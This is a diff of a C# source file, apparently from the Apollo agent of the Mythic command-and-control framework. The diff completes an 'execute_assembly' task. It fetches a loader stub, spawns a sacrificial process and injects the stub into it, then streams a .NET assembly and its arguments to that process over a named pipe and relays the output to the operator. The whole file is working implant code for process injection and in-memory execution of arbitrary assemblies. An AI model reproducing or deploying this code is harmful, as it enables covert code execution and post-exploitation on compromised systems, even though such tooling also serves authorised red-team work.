@@ -1,162 +1,181 @@
-﻿//using System;
-//using System.Collections.Generic;
-//using System.Linq;
-//using System.Text;
-//using ApolloInterop.Classes;
-//using ApolloInterop.Interfaces;
-//using ApolloInterop.Structs.MythicStructs;
-//using System.Runtime.Serialization;
-//using ApolloInterop.Serializers;
-//using System.Threading;
-//using System.IO;
-//using System.Collections.Concurrent;
-//using System.IO.Pipes;
-//using ApolloInterop.Structs.ApolloStructs;
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
+using System.Runtime.Serialization;
+using ApolloInterop.Serializers;
+using System.Threading;
+using System.IO;
+using System.Collections.Concurrent;
+using System.IO.Pipes;
+using ApolloInterop.Structs.ApolloStructs;
+using ApolloInterop.Classes.Core;
 
-//namespace Tasks
-//{
-//    public class execute_assembly : Tasking
-//    {
-//        [DataContract]
-//        internal struct ExecuteAssemblyParameters
-//        {
-//            [DataMember(Name = "pipe_name")]
-//            public string PipeName;
-//            [DataMember(Name = "assembly_name")]
-//            public string AssemblyName;
-//            [DataMember(Name = "assembly_arguments")]
-//            public string AssemblyArguments;
-//            [DataMember(Name = "loader_stub_id")]
-//            public string LoaderStubId;
-//        }
+namespace Tasks
+{
+    public class execute_assembly : Tasking
+    {
+        [DataContract]
+        internal struct ExecuteAssemblyParameters
+        {
+            [DataMember(Name = "pipe_name")]
+            public string PipeName;
+            [DataMember(Name = "assembly_name")]
+            public string AssemblyName;
+            [DataMember(Name = "assembly_arguments")]
+            public string AssemblyArguments;
+            [DataMember(Name = "loader_stub_id")]
+            public string LoaderStubId;
+        }
 
-//        private CancellationTokenSource _cts = new CancellationTokenSource();
-//        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
-//        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
-//        private JsonSerializer _serializer = new JsonSerializer();
-//        private AutoResetEvent _complete = new AutoResetEvent(false);
-//        private Action<object> _sendAction;
+        private CancellationTokenSource _cts = new CancellationTokenSource();
+        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
+        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
+        private JsonSerializer _serializer = new JsonSerializer();
+        private AutoResetEvent _complete = new AutoResetEvent(false);
+        private Action<object> _sendAction;
 
-//        public execute_assembly(IAgent agent, Task task) : base(agent, task)
-//        {
-//            _sendAction = (object p) =>
-//            {
-//                PipeStream ps = (PipeStream)p;
-//                while (ps.IsConnected && !_cts.IsCancellationRequested)
-//                {
-//                    WaitHandle.WaitAny(new WaitHandle[]
-//                    {
-//                    _senderEvent,
-//                    _cts.Token.WaitHandle
-//                    });
-//                    if (!_cts.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
-//                    {
-//                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
-//                    }
-//                }
-//                _complete.Set();
-//            };
-//        }
+        public execute_assembly(IAgent agent, Task task) : base(agent, task)
+        {
+            _sendAction = (object p) =>
+            {
+                PipeStream ps = (PipeStream)p;
+                while (ps.IsConnected && !_cts.IsCancellationRequested)
+                {
+                    WaitHandle.WaitAny(new WaitHandle[]
+                    {
+                    _senderEvent,
+                    _cts.Token.WaitHandle
+                    });
+                    if (!_cts.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
+                    {
+                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
+                    }
+                }
+                _complete.Set();
+            };
+        }
 
-//        public override void Kill()
-//        {
-//            _cancellationToken.Cancel();
-//        }
+        public override void Kill()
+        {
+            _cancellationToken.Cancel();
+        }
 
-//        public override System.Threading.Tasks.Task CreateTasking()
-//        {
-//            return new System.Threading.Tasks.Task(() =>
-//            {
-//                TaskResponse resp;
-//                try
-//                {
-//                    ExecuteAssemblyParameters parameters = _jsonSerializer.Deserialize<ExecuteAssemblyParameters>(_data.Parameters);
-//                    if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
-//                        string.IsNullOrEmpty(parameters.AssemblyName) ||
-//                        string.IsNullOrEmpty(parameters.PipeName))
-//                    {
-//                        resp = CreateTaskResponse(
-//                            $"One or more required arguments was not provided.",
-//                            true,
-//                            "error");
-//                    }
-//                    else
-//                    {
-//                        if (_agent.GetFileManager().GetFile(_cts.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
-//                        {
-//                            ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
-//                            var proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
-//                            if (proc.Inject(exeAsmPic))
-//                            {
-//                                IPCCommandArguments cmdargs = new IPCCommandArguments
-//                                {
-//                                    ByteData = new byte[0],
-//                                    StringData = 
-//                                };
-//                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-//                                client.ConnectionEstablished += Client_ConnectionEstablished;
-//                                client.MessageReceived += Client_MessageReceived;
-//                                client.Disconnect += Client_Disconnect;
-//                                client.Connect(3000);
-//                                IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-//                                foreach (IPCChunkedData chunk in chunks)
-//                                {
-//                                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
-//                                }
-//                                _senderEvent.Set();
-//                                _complete.WaitOne();
-//                            } else
-//                            {
-//                                resp = CreateTaskResponse(
-//                                    $"Failed to inject assembly loader into sacrificial process.",
-//                                    true,
-//                                    "error");
-//                            }
-//                        } else
-//                        {
-//                            resp = CreateTaskResponse(
-//                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
-//                                true,
-//                                "error");
-//                        }
-//                    }
-//                }
-//                catch (Exception ex)
-//                {
-//                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
-//                }
-//                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-//            }, _cancellationToken.Token);
-//        }
+        public override System.Threading.Tasks.Task CreateTasking()
+        {
+            return new System.Threading.Tasks.Task(() =>
+            {
+                TaskResponse resp;
+                Process proc = null;
+                try
+                {
+                    ExecuteAssemblyParameters parameters = _jsonSerializer.Deserialize<ExecuteAssemblyParameters>(_data.Parameters);
+                    if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
+                        string.IsNullOrEmpty(parameters.AssemblyName) ||
+                        string.IsNullOrEmpty(parameters.PipeName))
+                    {
+                        resp = CreateTaskResponse(
+                            $"One or more required arguments was not provided.",
+                            true,
+                            "error");
+                    }
+                    else
+                    {
+                        if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
+                        {
+                            if (_agent.GetFileManager().GetFile(_cts.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
+                            {
+                                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
+                                proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
+                                if (proc.Inject(exeAsmPic))
+                                {
+                                    IPCCommandArguments cmdargs = new IPCCommandArguments
+                                    {
+                                        ByteData = assemblyBytes,
+                                        StringData = parameters.AssemblyArguments
+                                    };
+                                    AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
+                                    client.ConnectionEstablished += Client_ConnectionEstablished;
+                                    client.MessageReceived += Client_MessageReceived;
+                                    client.Disconnect += Client_Disconnect;
+                                    if (client.Connect(3000))
+                                    {
+                                        IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
+                                        foreach (IPCChunkedData chunk in chunks)
+                                        {
+                                            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+                                        }
+                                        _senderEvent.Set();
+                                        _complete.WaitOne();
+                                        resp = CreateTaskResponse("", true);
+                                    } else
+                                    {
+                                        resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
+                                    }
+                                }
+                                else
+                                {
+                                    resp = CreateTaskResponse(
+                                        $"Failed to inject assembly loader into sacrificial process.",
+                                        true,
+                                        "error");
+                                }
+                            }
+                            else
+                            {
+                                resp = CreateTaskResponse(
+                                    $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
+                                    true,
+                                    "error");
+                            }
+                        } else
+                        {
+                            resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
+                }
+                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+            }, _cancellationToken.Token);
+        }
 
-//        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
-//        {
-//            e.Pipe.Close();
-//            _cts.Cancel();
-//            _complete.Set();
-//        }
+        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
+        {
+            e.Pipe.Close();
+            _cts.Cancel();
+            _complete.Set();
+        }
 
-//        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
-//        {
-//            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe);
-//        }
+        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
+        {
+            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cts.Token);
+        }
 
-//        public void OnAsyncMessageSent(IAsyncResult result)
-//        {
-//            PipeStream pipe = (PipeStream)result.AsyncState;
-//            // Potentially delete this since theoretically the sender Task does everything
-//            if (pipe.IsConnected && !_cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
-//            {
-//                pipe.EndWrite(result);
-//                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
-//            }
-//        }
+        public void OnAsyncMessageSent(IAsyncResult result)
+        {
+            PipeStream pipe = (PipeStream)result.AsyncState;
+            // Potentially delete this since theoretically the sender Task does everything
+            if (pipe.IsConnected && !_cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
+            {
+                pipe.EndWrite(result);
+                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
+            }
+        }
 
-//        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
-//        {
-//            IPCData d = e.Data;
-//            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
-//            Console.Write(msg);
-//        }
-//    }
-//}
+        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
+        {
+            IPCData d = e.Data;
+            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
+            _agent.GetTaskManager().AddTaskResponseToQueue(
+                CreateTaskResponse(
+                    msg,
+                    false));
+        }
+    }
+}
